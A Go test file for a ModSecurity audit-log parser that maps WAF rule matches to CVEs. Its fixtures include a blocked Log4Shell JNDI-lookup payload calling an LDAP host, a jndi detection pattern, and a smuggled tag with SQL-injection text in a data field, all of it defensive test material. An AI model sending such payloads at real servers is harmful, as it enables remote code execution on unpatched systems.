package modsecurity

import (
	"slices"
	"strings"
	"testing"
	"time"
)

// A serial audit log entry as ModSecurity 2.9 writes it for a block by our
// Log4Shell virtual patch plus a CRS rule tagged with another CVE.
const vpatchAuditEntry = `--8a7f1c2e-A--
[02/Nov/2026:10:14:03.512345 +0000] ZRk3a8CoAAIAAAB1 198.51.100.23 51234 192.0.2.10 80
--8a7f1c2e-B--
GET /?q=%24%7B%24%7Blower%3Aj%7Dndi%3Aldap%3A%2F%2F203.0.113.9%2Fa%7D HTTP/1.1
Host: shop.example.com
User-Agent: curl/8.5.0

--8a7f1c2e-F--
HTTP/1.1 403 Forbidden
Content-Type: text/html; charset=iso-8859-1

--8a7f1c2e-H--
Message: Access denied with code 403 (phase 2). Pattern match "(?i)\\$\\{[^}]{0,15}(?:jndi" at ARGS:q. [file "/etc/modsecurity/infrafence/infrafence-dynamic.conf"] [line "4"] [id "9920004"] [msg "InfraFence virtual patch: CVE-2021-44228 Log4Shell JNDI lookup"] [data "${${lower:j}ndi:ldap://203.0.113.9/a}"] [severity "CRITICAL"] [tag "infrafence/vpatch"] [tag "CVE-2021-44228"]
Message: Warning. Matched phrase "jndi:" at ARGS:q. [file "/usr/share/modsecurity-crs/rules/REQUEST-944-APPLICATION-ATTACK-JAVA.conf"] [line "120"] [id "944150"] [msg "Potential Remote Command Execution: Log4j / Log4shell"] [severity "CRITICAL"] [tag "attack-rce"] [tag "cve/cve-2021-44228"] [tag "cve-2021-45046"]
Action: Intercepted (phase 2)
Engine-Mode: "ENABLED"

--8a7f1c2e-Z--
`

func TestAuditEntryCVEs(t *testing.T) {
	var got *AuditEntry
	w := &AuditLogWatcher{onEvent: func(e AuditEntry) { got = &e }, recentIPs: map[string]time.Time{}}
	buf := vpatchAuditEntry
	w.processBuffer(&buf)
	if got == nil {
		t.Fatal("entry not parsed")
	}
	want := []string{"CVE-2021-44228", "CVE-2021-45046"}
	if cves := got.CVEs(); !slices.Equal(cves, want) {
		t.Errorf("CVEs() = %v, want %v", cves, want)
	}
}

func TestAuditEntryCVEsByRuleID(t *testing.T) {
	// Our patch rule without CVE tags (e.g. an older catalog): the id is enough.
	e := AuditEntry{Rules: []RuleMatch{{ID: "9920001", Msg: "path traversal"}}}
	if cves := e.CVEs(); !slices.Equal(cves, []string{"CVE-2021-41773"}) {
		t.Errorf("CVEs() = %v", cves)
	}
	// Generic CRS rule: no CVE.
	e = AuditEntry{Rules: []RuleMatch{{ID: "942100", Msg: "SQL Injection Attack Detected via libinjection", Tags: []string{"attack-sqli", "OWASP_CRS"}}}}
	if cves := e.CVEs(); len(cves) != 0 {
		t.Errorf("CVEs() = %v, want none", cves)
	}
}

func TestVirtualPatchCVEEveryEntry(t *testing.T) {
	all, err := VirtualPatches()
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range all {
		m := secRuleIDRe.FindStringSubmatch(p.Rule)
		if m == nil {
			t.Fatalf("%s: no rule id", p.RuleID)
		}
		if cve, ok := VirtualPatchCVE(m[1]); !ok || cve != p.CVE {
			t.Errorf("rule %s: got %q, want %q", m[1], cve, p.CVE)
		}
	}
	if _, ok := VirtualPatchCVE("9929999"); ok {
		t.Error("the probe rule is not a patch")
	}
}

// Request data in the log line must not attribute a CVE: ModSecurity escapes quotes in
// [data], and only whole tags count (not CVE ids inside a message or a longer tag).
func TestAuditEntryCVEsIgnoresRequestData(t *testing.T) {
	entry := strings.Replace(vpatchAuditEntry, "[data \"${${lower:j}ndi:ldap://203.0.113.9/a}\"]",
		`[data "q=[tag \"CVE-2099-0001\"] union select 1"]`, 1)
	var got *AuditEntry
	w := &AuditLogWatcher{onEvent: func(e AuditEntry) { got = &e }, recentIPs: map[string]time.Time{}}
	w.processBuffer(&entry)
	if got == nil {
		t.Fatal("entry not parsed")
	}
	if cves := got.CVEs(); !slices.Equal(cves, []string{"CVE-2021-44228", "CVE-2021-45046"}) {
		t.Errorf("CVEs() = %v", cves)
	}
	e := AuditEntry{Rules: []RuleMatch{{ID: "1", Msg: "Attack on CVE-2099-0002", Tags: []string{"attack-rce CVE-2099-0003", "CVE-2099-0004"}}}}
	if cves := e.CVEs(); !slices.Equal(cves, []string{"CVE-2099-0004"}) {
		t.Errorf("CVEs() = %v, want only the whole tag", cves)
	}
}

// A logged request without a rule match (the agent's own nolog probe, answered 403) is no
// event and does not use up the rate limit of its address.
func TestAuditEntryWithoutRulesKeepsRateLimit(t *testing.T) {
	probe := `--aa11bb22-A--
[02/Nov/2026:10:14:01.000000 +0000] ZRk3a8CoAAIAAAB0 198.51.100.23 51230 192.0.2.10 80
--aa11bb22-B--
GET / HTTP/1.1
Host: 127.0.0.1
X-InfraFence-Probe: vpatch-check

--aa11bb22-F--
HTTP/1.1 403 Forbidden

--aa11bb22-H--
Action: Intercepted (phase 1)
Engine-Mode: "ENABLED"

--aa11bb22-Z--
`
	var got []AuditEntry
	w := &AuditLogWatcher{onEvent: func(e AuditEntry) { got = append(got, e) }, recentIPs: map[string]time.Time{}, rateLimit: 10 * time.Second}
	buf := probe + vpatchAuditEntry
	w.processBuffer(&buf)
	if len(got) != 1 || got[0].Rules[0].ID != "9920004" {
		t.Fatalf("got %d events, want the block only", len(got))
	}
}
